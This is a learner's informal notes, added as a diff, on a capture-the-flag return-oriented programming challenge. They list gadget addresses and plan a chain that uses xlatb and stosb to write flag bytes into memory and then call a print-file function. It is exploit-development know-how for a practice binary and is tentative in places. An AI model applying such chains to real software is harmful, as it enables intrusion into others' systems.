@@ -1,0 +1,63 @@
+In this challenge it seems like there will be less usefull gagets availible to me, so I will first go through and see what I can find to work with
+
+
+The gagets I was able to found are the following
+
+	0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;:
+	
+
+There are also these in the questionable gaget section
+
+   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
+   0x0000000000400629 <+1>:     ret
+   0x000000000040062a <+2>:     pop    rdx
+   0x000000000040062b <+3>:     pop    rcx
+   0x000000000040062c <+4>:     add    rcx,0x3ef2
+   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
+   0x0000000000400638 <+16>:    ret
+   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
+   0x000000000040063a <+18>:    ret
+   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
+
+The stos instruction copies a string possibly byte by byte. I wonder if it will copy the byte in al to the adress of rdi.
+
+I should honestly just attempt to do some expirements with this and see if I can use this as my write gaget
+
+
+Ok I think I was able to find a combination that will work
+
+
+the xlat instruction will write a byte from memory into the al register and then the stos instruction will take the byte from al and store it in the location pointed to by rdi?? (maybe not sure on location)
+
+
+	0x0000000000400610: mov eax, 0; pop rbp; ret;
+	0x00000000004006a3: pop rdi; ret;
+	0x0000000000400639: stosb byte ptr [rdi], al; ret;
+	0x000000000040069a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+
+
+
+Ok I think the plan is to just look through the binary and see if I can find the hard coded bytes for each char of the flag that I need. I will then set rbx to point to those bytes and then use the xlatb instruction to load those bytes into al. Once in al I will then write them to my memory location with stos. So the stack will look sorta like this
+
+	Note: XLAB 0x0000000000400628: xlatb; ret; 
+	Set AL to memory byte [RBX + unsigned AL].
+
+pop rbx
+location of f in the binary
+bunch of random junk from other pops
+xlatb instruction location 
+
+# now the f char is in al
+
+pop rdi 
+location to write to
+stosb instruction
+
+
+At this point I should have achived an arbitrary write of f to my target locationi
+
+# Finally we pop rdi and then call printf function
+
+0x00000000004006a3: pop rdi; ret;
+location of the string
+printfile location
